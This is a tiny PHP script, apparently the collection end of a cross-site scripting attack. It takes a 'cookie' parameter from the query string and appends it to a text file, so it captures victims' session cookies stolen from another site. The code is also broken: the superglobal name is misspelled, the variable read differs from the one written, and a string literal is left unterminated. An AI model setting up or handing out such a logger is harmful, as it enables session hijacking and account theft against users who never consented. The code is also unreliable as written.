<?php
$cookie1=$HTTP_GET_VAR["cookie"];
$file=fopen("txt.txt",'a');
fwrite($file,$cookie . "\n\n\");
?>
